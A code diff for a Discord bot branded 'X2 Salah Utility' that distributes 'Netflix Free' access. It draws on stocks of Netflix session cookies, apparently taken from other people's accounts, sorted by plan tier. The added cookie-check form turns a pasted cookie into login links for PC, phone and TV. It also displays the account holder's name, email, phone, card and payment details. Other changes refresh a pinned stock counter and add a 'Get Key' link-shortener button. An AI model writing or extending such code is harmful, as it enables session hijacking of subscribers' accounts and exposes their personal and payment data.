@@ -9,7 +9,7 @@ import threading
 import re
 from concurrent.futures import ThreadPoolExecutor
 from dataclasses import dataclass
-from datetime import datetime, timedelta, time as dt_time, timedelta, time as dt_time
+from datetime import datetime, timedelta, time as dt_time
 from pathlib import Path
 from base64 import b64decode
 from typing import Optional, List, Dict, Any, Tuple, Set, Callable, Awaitable
@@ -28,7 +28,21 @@ try:
 except ImportError:
     HAS_ASYNCPG = False
 
-from netflix_checker import check_cookie_file, quick_check_cookie_content
+from netflix_checker import (
+    check_cookie_file,
+    quick_check_cookie_content,
+    extract_cookies_dict,
+    _get_session,
+    get_account_page,
+    is_subscribed_account,
+    _build_info_dict,
+    create_nftoken,
+    build_login_link,
+)
+
+BOT_VERSION = "v1.0.0"
+NETFLIX_BANNER_GIF = "https://i.postimg.cc/Xq0kFFCF/NETFLIX-Red-Matrix.gif"
+GET_KEY_URL = "https://linkjust.com/"
 
 DISCORD_BOT_TOKEN = os.environ.get("DISCORD_TOKEN", "").strip()
 GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "").strip()
@@ -51,6 +65,9 @@ COOLDOWN_HOURS = 24
 CHECK_ALL_HOUR = 3
 CHECK_ALL_MINUTE = 0
 CHECK_ALL_INTERVAL_DAYS = 2
+
+COOKIE_CHECK_LIMIT = 5
+COOKIE_CHECK_WINDOW_SECONDS = 24 * 60 * 60
 
 _DEFAULT_NETFLIX_LOG_URL = "https://raw.githubusercontent.com/Afrsto/bot-users/main/Netflix-users.txt"
 NETFLIX_LOG_URL = os.environ.get("NETFLIX_LOG_URL", "").strip() or _DEFAULT_NETFLIX_LOG_URL
@@ -216,6 +233,8 @@ _admin_registry: Dict[int, Dict] = {}
 _banned_user_ids: set[int] = set()
 _ban_attempt_counts: Dict[int, int] = {}
 _banned_guild_ids: set[int] = set()
+
+_cookie_check_attempts: Dict[int, List[float]] = {}
 
 def load_admins_from_github() -> Dict[int, Dict]:
     raw, _ = _read_github_file(ADMIN_USERS_GITHUB_REPO, ADMIN_USERS_GITHUB_PATH)
@@ -540,7 +559,7 @@ def get_locale_info(locale_str: str) -> Tuple[str, str, str]:
 
 TRANSLATIONS: Dict[str, Dict[str, str]] = {
     "en": {
-        "lang_prompt": "🌐 **Please select your language:**\n🌐 **الرجاء اختيار اللغة:**",
+        "lang_prompt": "🌐 **Please select your language:**",
         "lang_selected": "✅ Language selected: **English**",
         "confirm_prompt": "🎬 **Please choose the streaming quality**\n",
         "device_prompt": "📱 **Choose how you want to register: PC, Phone, or TV**",
@@ -569,18 +588,8 @@ TRANSLATIONS: Dict[str, Dict[str, str]] = {
         "wrong_guild": "❌ This bot is not available in this server.",
         "not_admin": "❌ You do not have permission to use this command.",
         "cooldown": "⏳ You already generated a link recently.\n\n⌛ Please wait **{hours}h {minutes}m** before creating another one.",
-        "retry_prompt": "❌ The attempt failed. Please try again.\n\n❌ فشلت المحاولة. يرجى المحاولة مرة أخرى.\n\n🔄 **Try Again | حاول مرة أخرى**",
-        "retry_button": "🔄 Try Again | حاول مرة أخرى",
-        "setup_desc": (
-            "Welcome! 👋 Use the `/create` command to generate a Netflix login link.\n\n"
-            "**📋 How to use:**\n"
-            "1️⃣  Type `/create` in this channel.\n"
-            "2️⃣  Select your preferred language.\n"
-            "3️⃣  Choose your streaming quality: **HD 720p**, **Full HD 1080p**, or **Ultra HD 4K**.\n"
-            "4️⃣  Choose your device: **PC**, **Phone**, or **TV**.\n"
-            "5️⃣  Wait a few seconds for your personal link.\n\n"
-            "*⚠️ Note: Links are single-use. Messages auto-delete after 1 minute for privacy.*"
-        ),
+        "retry_prompt": "❌ The attempt failed. Please try again.\n\n🔄 **Try Again**",
+        "retry_button": "🔄 Try Again",
         "account_inactive": "❌ This account is not currently active or cannot generate a login token. It may be unsubscribed or expired.",
         "validation_failed": "❌ Could not validate the account. Please try again later.",
         "failure": "❌ Failure",
@@ -617,24 +626,17 @@ TRANSLATIONS: Dict[str, Dict[str, str]] = {
         "cooldown": "\u200f⏳ لقد حصلت على رابط مؤخراً.\n\n\u200f⌛ انتظر **{hours} ساعة و{minutes} دقيقة** قبل إنشاء رابط جديد.",
         "retry_prompt": "❌ The attempt failed. Please try again.\n\n❌ فشلت المحاولة. يرجى المحاولة مرة أخرى.\n\n🔄 **Try Again | حاول مرة أخرى**",
         "retry_button": "🔄 Try Again | حاول مرة أخرى",
-        "setup_desc": (
-            "مرحباً! 👋 استخدم أمر `/create` لإنشاء رابط تسجيل دخول لـ نتفليكس.\n\n"
-            "**📋 طريقة الاستخدام:**\n"
-            "1️⃣  اكتب `/create` في هذه القناة.\n"
-            "2️⃣  اختر لغتك المفضلة.\n"
-            "3️⃣  اختر جودة العرض: **HD 720p** أو **Full HD 1080p** أو **Ultra HD 4K**.\n"
-            "4️⃣  اختر جهازك: **PC** أو **Phone** أو **TV**.\n"
-            "5️⃣  انتظر بضع ثوانٍ للحصول على رابطك الشخصي.\n\n"
-            "\u200f*⚠️ ملاحظة: الروابط للاستخدام مرة واحدة. يتم حذف الرسائل تلقائياً بعد دقيقة.*"
-        ),
         "account_inactive": "❌ هذا الحساب غير نشط حاليًا أو لا يمكن إنشاء رمز تسجيل الدخول. قد يكون غير مشترك أو منتهي الصلاحية.",
         "validation_failed": "❌ تعذر التحقق من الحساب. يرجى المحاولة مرة أخرى لاحقًا.",
         "failure": "❌ فشل",
-    }
+    },
 }
 
 def get_user_lang(interaction: discord.Interaction) -> str:
-    return "ar" if str(interaction.locale).startswith("ar") else "en"
+    try:
+        return "ar" if str(interaction.locale).startswith("ar") else "en"
+    except Exception:
+        return "en"
 
 class ChannelLogConfig:
     def __init__(self, file_path: Path = GUILD_CONFIG_FILE):
@@ -724,7 +726,7 @@ async def send_user_activity_to_log_channel(
     embed.set_thumbnail(url=avatar_url)
 
     lang_label = {"en": "English 🇬🇧", "ar": "Arabic 🇸🇦"}.get(language, language)
-    device_display = {"pc": "PC 🖥️", "phone": "Phone 📱", "tv": "TV 📺"}.get(device, device.capitalize())
+    device_display = {"pc": "PC 🖥️", "phone": "Phone 📱", "tv": "TV 📺", "all": "All Devices 🖥️📱📺"}.get(device, device.capitalize())
     channel_mention = interaction.channel.mention if interaction.channel else "N/A"
 
     plan = info.get("plan", "N/A")
@@ -1013,7 +1015,6 @@ channel_log_config = ChannelLogConfig()
 monitor = NetflixMonitor(bot, channel_log_config)
 
 class CheckAllScheduler:
-    """Run cookie quick-check every 2 days at 03:00 Africa/Cairo."""
 
     def __init__(self, bot: commands.Bot):
         self.bot = bot
@@ -1241,34 +1242,271 @@ def _count_txt_files_in_folder(quality_folder: str) -> int:
         return 0
     return len(list(local_dir.glob("*.txt")))
 
-async def _build_stats_embed() -> discord.Embed:
+async def _build_main_embed() -> discord.Embed:
     premium_count, standard_count, basic_count = await asyncio.gather(
         asyncio.to_thread(_count_txt_files_in_folder, "Premium"),
         asyncio.to_thread(_count_txt_files_in_folder, "Standard"),
         asyncio.to_thread(_count_txt_files_in_folder, "Basic"),
     )
+    total = premium_count + standard_count + basic_count
+
     embed = discord.Embed(
-        title="📊 Account Stock  |  المخزون الحالي",
-        color=discord.Color.from_rgb(46, 204, 113),
+        title="🎬 Netflix Checker | X2 Salah Utility",
+        description=(
+            f"🍪 **Alive cookies** — `{total}`\n"
+            f"⭐ **Premium:** `{premium_count}`   "
+            f"⭐ **Standard:** `{standard_count}`   "
+            f"⭐ **Basic:** `{basic_count}`\n"
+            f"🏷️ **Version:** `{BOT_VERSION}`    •    🟢 **Status:** Online"
+        ),
+        color=NETFLIX_RED,
         timestamp=datetime.now(EGYPT_TZ),
     )
-    embed.add_field(
-        name="💎 Ultra HD 4K — Premium",
-        value=f"**{premium_count}** account(s) available",
-        inline=True,
-    )
-    embed.add_field(
-        name="🎬 Full HD 1080p — Standard",
-        value=f"**{standard_count}** account(s) available",
-        inline=True,
-    )
-    embed.add_field(
-        name="📺 HD 720p — Basic",
-        value=f"**{basic_count}** account(s) available",
-        inline=True,
-    )
-    embed.set_footer(text="⚡ X2 Salah Utility  •  Netflix Bot 🎬")
+    embed.set_image(url=NETFLIX_BANNER_GIF)
+    embed.set_footer(text="X2 Salah Utility • Netflix Bot 📺")
     return embed
+
+def _check_cookie_all_devices(content: str) -> Tuple[Optional[Dict[str, str]], Optional[Dict[str, Any]]]:
+    if not content:
+        return None, None
+    cookies_dict = extract_cookies_dict(content)
+    if not cookies_dict or "NetflixId" not in cookies_dict:
+        return None, None
+
+    session = _get_session()
+    session.cookies.clear()
+    for name, value in cookies_dict.items():
+        session.cookies.set(name, value, domain=".netflix.com", path="/")
+
+    _, status_code, info = get_account_page(session)
+    if status_code != 200 or not info:
+        return None, None
+
+    is_subscribed = is_subscribed_account(info)
+    info_dict = _build_info_dict(info, is_subscribed)
+    if not is_subscribed:
+        return None, info_dict
+
+    nftoken, expires = create_nftoken(cookies_dict, attempts=3)
+    if not nftoken:
+        return None, info_dict
+
+    links = {d: build_login_link(nftoken, d) for d in ("pc", "phone", "tv")}
+    if expires:
+        try:
+            expiry_dt = datetime.fromtimestamp(expires)
+            info_dict["expires_at"] = expiry_dt.strftime("%Y-%m-%d %I:%M:%S %p")
+        except Exception:
+            info_dict["expires_at"] = str(expires)
+    else:
+        info_dict["expires_at"] = "N/A"
+    return links, info_dict
+
+class CookieCheckModal(discord.ui.Modal, title="⚙️ Check Cookie → Links"):
+    cookie_input: discord.ui.TextInput = discord.ui.TextInput(
+        label="Paste your Netflix cookie here",
+        style=discord.TextStyle.paragraph,
+        placeholder="NetflixId=...; SecureNetflixId=...; nfvdid=...; OptanonConsent=...",
+        required=True,
+        max_length=4000,
+    )
+
+    def __init__(self, original_interaction: discord.Interaction) -> None:
+        super().__init__()
+        self.original_interaction = original_interaction
+
+    async def on_submit(self, interaction: discord.Interaction) -> None:
+        cookie_content = (self.cookie_input.value or "").strip()
+        if not cookie_content:
+            await interaction.response.send_message(
+                "❌ No cookie provided.", ephemeral=True
+            )
+            return
+
+        if not is_admin(interaction.user.id):
+            now = time.time()
+            history = _cookie_check_attempts.get(interaction.user.id, [])
+            history = [t for t in history if now - t < COOKIE_CHECK_WINDOW_SECONDS]
+            if len(history) >= COOKIE_CHECK_LIMIT:
+                oldest = min(history)
+                remaining_seconds = COOKIE_CHECK_WINDOW_SECONDS - (now - oldest)
+                remaining_hours = max(0.0, remaining_seconds / 3600.0)
+                await interaction.response.send_message(
+                    f"⏳ You've reached the limit of **{COOKIE_CHECK_LIMIT}** cookie checks per 24 hours.\n"
+                    f"Please try again in about **{remaining_hours:.1f} h**.",
+                    ephemeral=True,
+                )
+                return
+            history.append(now)
+            _cookie_check_attempts[interaction.user.id] = history
+
+        await interaction.response.defer(ephemeral=True, thinking=True)
+
+        try:
+            links, info = await asyncio.wait_for(
+                asyncio.to_thread(_check_cookie_all_devices, cookie_content),
+                timeout=SCRIPT_TIMEOUT,
+            )
+        except asyncio.TimeoutError:
+            await interaction.followup.send(
+                "⌛ Validation took too long. Please try again later.", ephemeral=True
+            )
+            return
+        except Exception as exc:
+            log.error(f"Cookie check error: {exc}")
+            await interaction.followup.send(
+                "⚠️ An unexpected error occurred. Please try again.", ephemeral=True
+            )
+            return
+
+        if not links:
+            if info is None:
+                msg = (
+                    "❌ This cookie is **invalid**, **expired**, or missing the required "
+                    "`NetflixId` field."
+                )
+            else:
+                msg = (
+                    "❌ This account is **not currently active** or cannot generate login "
+                    "tokens. It may be unsubscribed or expired."
+                )
+            await interaction.followup.send(msg, ephemeral=True)
+            return
+
+        embed = discord.Embed(
+            title="✅ 🎬 Netflix Login Links Ready!",
+            color=NETFLIX_RED,
+            timestamp=datetime.now(),
+        )
+        embed.set_thumbnail(url=NETFLIX_LOGO)
+
+        field_map = {
+            "👤 Name": info.get("name", "N/A"),
+            "✉️ Email": info.get("email", "N/A"),
+            "🌍 Country": info.get("country", "N/A"),
+            "🎁 Plan": info.get("plan", "N/A"),
+            "💰 Plan Price": info.get("plan_price", "N/A"),
+            "📺 Max Streams": info.get("max_streams", "N/A"),
+            "📅 Member Since": info.get("member_since", "N/A"),
+            "🔄 Next Billing": info.get("next_billing", "N/A"),
+            "📊 Quality": info.get("quality", "N/A"),
+            "💳 Payment": info.get("payment", "N/A"),
+            "🏧 Card": info.get("card", "N/A"),
+            "📱 Phone": info.get("phone", "N/A"),
+            "⏸️ Days Left": info.get("days_left", "N/A"),
+            "🎫 Membership": info.get("membership_status", "N/A"),
+            "👤 Profiles": info.get("profiles", "N/A"),
+            "⏳ Expires at": info.get("expires_at", "N/A"),
+        }
+        for name, value in field_map.items():
+            if value and value != "N/A":
+                embed.add_field(name=name, value=f"`{value}`", inline=False)
+
+        embed.add_field(name="🖥️ PC Link", value=links["pc"], inline=False)
+        embed.add_field(name="📱 Phone Link", value=links["phone"], inline=False)
+        embed.add_field(name="📺 TV Link", value=links["tv"], inline=False)
+        embed.set_footer(
+            text="⚠️ These links are for personal use only – do not share them.  •  X2 Salah Utility 🎬"
+        )
+
+        await interaction.followup.send(embed=embed, ephemeral=True)
+
+        try:
+            activity_timestamp = datetime.now(EGYPT_TZ).strftime("%Y-%m-%d %H:%M:%S")
+            asyncio.create_task(
+                log_user_activity(
+                    interaction,
+                    "✅ Success",
+                    "Cookie check (all devices)",
+                    used_txt_files=[],
+                    language="en",
+                    quality="any",
+                    device="all",
+                    plan=info.get("plan", "N/A"),
+                    days_left=info.get("days_left", "N/A"),
+                    timestamp=activity_timestamp,
+                )
+            )
+        except Exception as exc:
+            log.warning(f"Failed to log cookie-check activity: {exc}")
+
+
+class MainMenuView(discord.ui.View):
+
+    def __init__(self) -> None:
+        super().__init__(timeout=None)
+
+        free_btn = discord.ui.Button(
+            label="Netflix Free",
+            style=discord.ButtonStyle.danger,
+            emoji="🎬",
+            custom_id="main_netflix_free",
+        )
+        free_btn.callback = self._netflix_free_callback
+        self.add_item(free_btn)
+
+        key_btn = discord.ui.Button(
+            label="Get Key",
+            style=discord.ButtonStyle.link,
+            url=GET_KEY_URL,
+            emoji="🔑",
+        )
+        self.add_item(key_btn)
+
+        check_btn = discord.ui.Button(
+            label="Check Cookie → Links",
+            style=discord.ButtonStyle.primary,
+            emoji="⚙️",
+            custom_id="main_check_cookie",
+        )
+        check_btn.callback = self._check_cookie_callback
+        self.add_item(check_btn)
+
+    async def _netflix_free_callback(self, interaction: discord.Interaction) -> None:
+        await _start_create_flow(interaction)
+
+    async def _check_cookie_callback(self, interaction: discord.Interaction) -> None:
+        modal = CookieCheckModal(interaction)
+        await interaction.response.send_modal(modal)
+
+
+async def _start_create_flow(interaction: discord.Interaction) -> None:
+    user_lang = get_user_lang(interaction)
+
+    if not is_allowed_channel(interaction):
+        guild_id = interaction.guild.id if interaction.guild else None
+        channel_id = config.get_channel_for_guild(guild_id) if guild_id else None
+        if channel_id is None:
+            await interaction.response.send_message(
+                TRANSLATIONS[user_lang]["wrong_channel_no_config"], ephemeral=True
+            )
+        else:
+            allowed_channel = bot.get_channel(channel_id)
+            mention = allowed_channel.mention if allowed_channel else "the designated channel"
+            await interaction.response.send_message(
+                TRANSLATIONS[user_lang]["wrong_channel_with_config"].format(channel=mention),
+                ephemeral=True,
+            )
+        return
+
+    on_cooldown, remaining_hours = await asyncio.to_thread(check_user_cooldown, interaction.user.id)
+    if on_cooldown:
+        total_minutes = int(remaining_hours * 60)
+        hours_left = total_minutes // 60
+        minutes_left = total_minutes % 60
+        msg = TRANSLATIONS[user_lang]["cooldown"].format(hours=hours_left, minutes=minutes_left)
+        await interaction.response.send_message(msg, ephemeral=True)
+        log.info(
+            f"Cooldown: {interaction.user} (ID: {interaction.user.id}) "
+            f"blocked – {hours_left}h {minutes_left}m remaining"
+        )
+        return
+
+    view = LanguageSelectView(interaction)
+    await interaction.response.send_message(
+        TRANSLATIONS["ar"]["lang_prompt"], view=view, ephemeral=True
+    )
+
 
 _used_cookie_files: List[Path] = []
 _used_github_cookie_names: List[str] = []
@@ -1356,7 +1594,7 @@ async def log_user_activity(
 
     channel_name = getattr(interaction.channel, "name", "N/A")
     lang_label = {"ar": "Arabic 🇸🇦", "en": "English 🇬🇧"}.get(language or "", language or "N/A")
-    device_label = {"pc": "PC", "phone": "Phone", "tv": "TV"}.get(device or "", "N/A")
+    device_label = {"pc": "PC", "phone": "Phone", "tv": "TV", "all": "All"}.get(device or "", "N/A")
     plan_display = plan or "N/A"
     days_left_display = days_left or "N/A"
 
@@ -1434,7 +1672,7 @@ def check_user_cooldown(user_id: int) -> Tuple[bool, float]:
         return True, remaining
     return False, 0.0
 
-_setup_message_ids: Dict[int, Dict[str, int]] = {}
+_setup_message_ids: Dict[int, Dict[str, Optional[int]]] = {}
 
 def _load_setup_tracker() -> None:
     global _setup_message_ids
@@ -1454,88 +1692,8 @@ def _save_setup_tracker() -> None:
         log.warning(f"Could not save setup tracker: {exc}")
 
 NETFLIX_RED = discord.Color.from_rgb(229, 9, 20)
-FOOTER_TEXT = "⚡ X2 Salah Utility  •  Netflix Bot 🎬"
+FOOTER_TEXT = "X2 Salah Utility • Netflix Bot 📺"
 NETFLIX_LOGO = "https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg"
-
-def _build_welcome_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title="🎬 Netflix Link Generator  |  مولد روابط نتفليكس",
-        color=NETFLIX_RED,
-        timestamp=datetime.now(EGYPT_TZ),
-    )
-    embed.set_thumbnail(url=NETFLIX_LOGO)
-    embed.add_field(
-        name="🇬🇧 Welcome | مرحباً 🇸🇦",
-        value=(
-            "Welcome to the **Netflix Link Generator**! 👋\n"
-            "This bot generates a personal Netflix login link on demand.\n\n"
-            "مرحباً بك في **مولد روابط نتفليكس**! 👋\n"
-            "يقوم هذا البوت بإنشاء رابط تسجيل دخول شخصي لنتفليكس عند الطلب."
-        ),
-        inline=False,
-    )
-    embed.add_field(
-        name="📋 How to use | طريقة الاستخدام",
-        value=(
-            "**🇬🇧 English Steps:**\n"
-            "1️⃣  Type `/create` in this channel\n"
-            "2️⃣  Select your language\n"
-            "3️⃣  Choose streaming quality (**HD**, **FHD**, or **4K**)\n"
-            "4️⃣  Choose your device (**PC**, **Phone**, or **TV**)\n"
-            "5️⃣  Receive your personal login link\n\n"
-            "**🇸🇦 الخطوات بالعربي:**\n"
-            "1️⃣  اكتب `/create` في هذه القناة\n"
-            "2️⃣  اختر لغتك\n"
-            "3️⃣  اختر جودة العرض (**HD** أو **FHD** أو **4K**)\n"
-            "4️⃣  اختر جهازك (**PC** أو **Phone** أو **TV**)\n"
-            "5️⃣  احصل على رابط تسجيل الدخول الشخصي"
-        ),
-        inline=False,
-    )
-    embed.add_field(
-        name="🛠️ Available Commands | الأوامر المتاحة",
-        value=(
-            "`/create` – Generate a Netflix login link | إنشاء رابط نتفليكس\n"
-            "`/ban` – Block a user (Admin) | حظر مستخدم (مسؤول)\n"
-            "`/unban` – Unblock a user (Admin) | رفع الحظر (مسؤول)\n"
-            "`/banserver` – Ban a server (Admin) | حظر سيرفر (مسؤول)\n"
-            "`/unbanserver` – Unban a server (Admin) | رفع حظر سيرفر (مسؤول)\n"
-            "`/channel` – Set bot channel | تعيين قناة البوت\n"
-            "`/channel_log` – Set activity log channel | تعيين قناة سجل النشاط\n"
-            "`/admin` – Manage bot admins (Admin) | إدارة المشرفين (مسؤول)\n"
-            "`/check_all` – Quick-validate cookies (no login links); backup & delete invalids (Admin) | تحقق سريع بدون روابط؛ نسخ احتياطي وحذف الفاسدة (مسؤول)"
-        ),
-        inline=False,
-    )
-    embed.set_footer(text=FOOTER_TEXT)
-    return embed
-
-def _build_rules_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title="📜 Rules & Guidelines  |  القواعد والإرشادات",
-        color=discord.Color.from_rgb(230, 126, 34),
-        timestamp=datetime.now(EGYPT_TZ),
-    )
-    embed.add_field(
-        name="🇬🇧 Rules (English)",
-        value=(
-            "🚫 **Rule 1:** Any suspicious activity will result in a permanent ban.\n\n"
-            "✅ **Rule 2:** Links are for personal use only – do **not** share them with others.\n\n"
-            "🔄 **Rule 3:** Messages auto-delete after **1 minute** for privacy."
-        ),
-        inline=False,
-    )
-    embed.add_field(
-        name="🇸🇦 القواعد (العربية)",
-        value=(
-            "🚫 **القاعدة 1:** أي نشاط مشبوه يؤدي إلى حظر دائم.\n\n"
-            "✅ **القاعدة 2:** الروابط للاستخدام الشخصي فقط – يُمنع مشاركتها مع الآخرين.\n\n"
-            "🔄 **القاعدة 3:** يتم حذف الرسائل تلقائياً بعد **دقيقة واحدة** لحماية الخصوصية."
-        ),
-        inline=False,
-    )
-    embed.set_footer(text=FOOTER_TEXT)
-    return embed
 
 async def _fetch_or_scan(channel: discord.TextChannel, msg_id: Optional[int], title_prefix: str) -> Optional[discord.Message]:
     if msg_id:
@@ -1557,71 +1715,48 @@ async def _fetch_or_scan(channel: discord.TextChannel, msg_id: Optional[int], ti
     return None
 
 async def send_or_update_setup_messages(channel: discord.TextChannel, guild_id: int) -> None:
-    stored = _setup_message_ids.get(guild_id, {})
-    welcome_embed = _build_welcome_embed()
-    rules_embed = _build_rules_embed()
-    stats_embed = await _build_stats_embed()
+    stored = _setup_message_ids.get(guild_id, {}) or {}
 
-    welcome_msg = await _fetch_or_scan(channel, stored.get("welcome"), "🎬 Netflix Link Generator")
-    if welcome_msg:
+    for legacy_key in ("welcome", "rules"):
+        legacy_id = stored.get(legacy_key)
+        if legacy_id:
+            try:
+                legacy_msg = await channel.fetch_message(legacy_id)
+                await legacy_msg.delete()
+                log.info(f"Deleted legacy '{legacy_key}' message {legacy_id}")
+            except Exception:
+                pass
+
+    main_embed = await _build_main_embed()
+    view = MainMenuView()
+
+    main_id = stored.get("main") or stored.get("stats")
+    main_msg = await _fetch_or_scan(channel, main_id, "🎬 Netflix Checker")
+
+    if main_msg:
         try:
-            await welcome_msg.edit(embed=welcome_embed)
-            log.info(f"Updated welcome message {welcome_msg.id}")
+            await main_msg.edit(embed=main_embed, view=view)
+            log.info(f"Updated main message {main_msg.id}")
         except Exception as exc:
-            log.warning(f"Could not update welcome message: {exc}")
-            welcome_msg = None
-    if welcome_msg is None:
+            log.warning(f"Could not update main message: {exc}")
+            main_msg = None
+
+    if main_msg is None:
         try:
-            welcome_msg = await channel.send(embed=welcome_embed)
-            await welcome_msg.pin()
-            log.info(f"Pinned welcome message {welcome_msg.id} in #{channel.name}")
+            main_msg = await channel.send(embed=main_embed, view=view)
+            try:
+                await main_msg.pin()
+            except Exception:
+                pass
+            log.info(f"Sent and pinned main message {main_msg.id} in #{channel.name}")
         except discord.Forbidden:
             log.warning(f"No permission to send/pin in #{channel.name}")
             return
         except Exception as exc:
-            log.error(f"Failed to send welcome message: {exc}")
+            log.error(f"Failed to send main message: {exc}")
             return
 
-    rules_msg = await _fetch_or_scan(channel, stored.get("rules"), "📜 Rules & Guidelines")
-    if rules_msg:
-        try:
-            await rules_msg.edit(embed=rules_embed)
-            log.info(f"Updated rules message {rules_msg.id}")
-        except Exception as exc:
-            log.warning(f"Could not update rules message: {exc}")
-            rules_msg = None
-    if rules_msg is None:
-        try:
-            rules_msg = await channel.send(embed=rules_embed)
-            await rules_msg.pin()
-            log.info(f"Pinned rules message {rules_msg.id} in #{channel.name}")
-        except Exception as exc:
-            log.error(f"Failed to send rules message: {exc}")
-
-    stats_msg = await _fetch_or_scan(channel, stored.get("stats"), "📊 Account Stock")
-    if stats_msg:
-        try:
-            await stats_msg.edit(embed=stats_embed)
-            log.info(f"Updated stats message {stats_msg.id}")
-        except Exception as exc:
-            log.warning(f"Could not update stats message: {exc}")
-            stats_msg = None
-    if stats_msg is None:
-        try:
-            stats_msg = await channel.send(embed=stats_embed)
-            try:
-                await stats_msg.pin()
-            except Exception:
-                pass
-            log.info(f"Sent stats message {stats_msg.id} in #{channel.name}")
-        except Exception as exc:
-            log.error(f"Failed to send stats message: {exc}")
-
-    _setup_message_ids[guild_id] = {
-        "welcome": welcome_msg.id if welcome_msg else None,
-        "rules": rules_msg.id if rules_msg else None,
-        "stats": stats_msg.id if stats_msg else None,
-    }
+    _setup_message_ids[guild_id] = {"main": main_msg.id if main_msg else None}
     _save_setup_tracker()
 
 async def _refresh_stats_message(guild_id: int) -> None:
@@ -1631,44 +1766,49 @@ async def _refresh_stats_message(guild_id: int) -> None:
     channel = bot.get_channel(channel_id)
     if not channel:
         return
-    stored = _setup_message_ids.get(guild_id, {})
-    stats_msg_id = stored.get("stats")
-    stats_embed = await _build_stats_embed()
-    if stats_msg_id:
+
+    stored = _setup_message_ids.get(guild_id, {}) or {}
+    main_id = stored.get("main") or stored.get("stats")
+    main_embed = await _build_main_embed()
+    view = MainMenuView()
+
+    if main_id:
         try:
-            stats_msg = await channel.fetch_message(stats_msg_id)
-            await stats_msg.edit(embed=stats_embed)
-            log.info(f"Refreshed stats message {stats_msg_id} for guild {guild_id}")
+            stats_msg = await channel.fetch_message(main_id)
+            await stats_msg.edit(embed=main_embed, view=view)
+            log.info(f"Refreshed main message {main_id} for guild {guild_id}")
             return
         except discord.NotFound:
-            log.info(f"Tracked stats message {stats_msg_id} gone – scanning history")
-            _setup_message_ids.setdefault(guild_id, {})["stats"] = None
+            log.info(f"Tracked main message {main_id} gone – scanning history")
+            _setup_message_ids.setdefault(guild_id, {})["main"] = None
         except Exception as exc:
-            log.warning(f"Could not refresh stats message: {exc}")
+            log.warning(f"Could not refresh main message: {exc}")
             return
+
     try:
         async for msg in channel.history(limit=50):
             if msg.author != bot.user:
                 continue
-            if msg.embeds and msg.embeds[0].title and msg.embeds[0].title.startswith("📊 Account Stock"):
-                await msg.edit(embed=stats_embed)
-                _setup_message_ids.setdefault(guild_id, {})["stats"] = msg.id
+            if msg.embeds and msg.embeds[0].title and msg.embeds[0].title.startswith("🎬 Netflix Checker"):
+                await msg.edit(embed=main_embed, view=view)
+                _setup_message_ids.setdefault(guild_id, {})["main"] = msg.id
                 _save_setup_tracker()
-                log.info(f"Found and refreshed existing stats message {msg.id} in guild {guild_id}")
+                log.info(f"Found and refreshed existing main message {msg.id} in guild {guild_id}")
                 return
     except Exception as exc:
         log.warning(f"History scan failed for guild {guild_id}: {exc}")
+
     try:
-        new_msg = await channel.send(embed=stats_embed)
+        new_msg = await channel.send(embed=main_embed, view=view)
         try:
             await new_msg.pin()
         except Exception:
             pass
-        _setup_message_ids.setdefault(guild_id, {})["stats"] = new_msg.id
+        _setup_message_ids.setdefault(guild_id, {})["main"] = new_msg.id
         _save_setup_tracker()
-        log.info(f"Re-sent and pinned stats message {new_msg.id} for guild {guild_id}")
+        log.info(f"Re-sent and pinned main message {new_msg.id} for guild {guild_id}")
     except Exception as exc:
-        log.error(f"Failed to re-send stats message: {exc}")
+        log.error(f"Failed to re-send main message: {exc}")
 
 async def cleanup_messages(
     channel: discord.TextChannel,
@@ -1906,7 +2046,6 @@ def _save_check_all_last_run(when: datetime) -> None:
         log.warning(f"Failed to write {CHECK_ALL_SCHEDULE_FILE}: {exc}")
 
 def _next_check_all_run(now: Optional[datetime] = None) -> datetime:
-    """Next 03:00 Egypt run on the every-2-days cadence."""
     now = now or datetime.now(EGYPT_TZ)
     if now.tzinfo is None:
         now = now.replace(tzinfo=EGYPT_TZ)
@@ -1931,7 +2070,6 @@ def _next_check_all_run(now: Optional[datetime] = None) -> datetime:
 async def run_check_all_pipeline(
     progress_callback: Optional[Callable[[int, int], Awaitable[None]]] = None,
 ) -> Dict[str, int]:
-    """Quick-validate all cookies; backup and delete invalids. Shared by slash + scheduler."""
     lock = _get_check_all_lock()
     async with lock:
         all_files = await _get_all_cookie_files_from_source()
@@ -1982,7 +2120,7 @@ async def run_check_all_pipeline(
 def _build_check_all_report_embed(stats: Dict[str, int]) -> discord.Embed:
     embed = discord.Embed(
         title="🔍 Quick Check Report",
-        color=discord.Color.blue(),
+        color=NETFLIX_RED,
         timestamp=datetime.now(EGYPT_TZ),
     )
     embed.add_field(name="📂 Total Files", value=str(stats["total"]), inline=True)
@@ -2055,7 +2193,6 @@ async def _pick_cookie_candidate(
     quality_folder: str,
     exclude_names: Set[str],
 ) -> Tuple[Optional[str], Optional[str]]:
-    """Return (filename, content), skipping names in exclude_names."""
     if COOKIES_GITHUB_REPO and COOKIES_GITHUB_PATH is not None:
         base_path = (COOKIES_GITHUB_PATH.rstrip("/") + "/" + quality_folder) if COOKIES_GITHUB_PATH else quality_folder
         github_names = await asyncio.to_thread(_fetch_github_cookie_list_in_path, base_path)
@@ -2189,7 +2326,6 @@ async def _send_success_link_response(
 
 
 def _cookie_info_is_confirmed_inactive(info: Optional[Dict[str, Any]]) -> bool:
-    """True when checker returned account info that clearly is not an active subscription."""
     if info is None:
         return True
     status = str(info.get("membership_status") or "").strip().upper()
@@ -2213,7 +2349,6 @@ def _cookie_info_is_confirmed_inactive(info: Optional[Dict[str, Any]]) -> bool:
 
 
 async def _wait_for_check_all_idle(interaction: discord.Interaction, language: str) -> None:
-    """Do not start Netflix create work while /check_all (manual or scheduled) holds the lock."""
     lock = _get_check_all_lock()
     if not lock.locked():
         return
@@ -2263,7 +2398,6 @@ async def _generate_and_send_link(
         except Exception:
             pass
 
-        # If a scheduled/manual check_all started while we were retrying, pause again.
         await _wait_for_check_all_idle(interaction, lang)
 
         if retry_same_content is not None and retry_same_name is not None:
@@ -2326,7 +2460,6 @@ async def _generate_and_send_link(
 
         last_info = info
 
-        # Timeout / transport errors: keep the cookie; retry same file a few times, then soft-skip.
         if timed_out or errored:
             key = chosen_file_name or ""
             soft_timeout_counts[key] = soft_timeout_counts.get(key, 0) + 1
@@ -2346,7 +2479,6 @@ async def _generate_and_send_link(
                 )
             continue
 
-        # Confirmed invalid → delete. Active account with missing link (nftoken flake) → soft-exclude only.
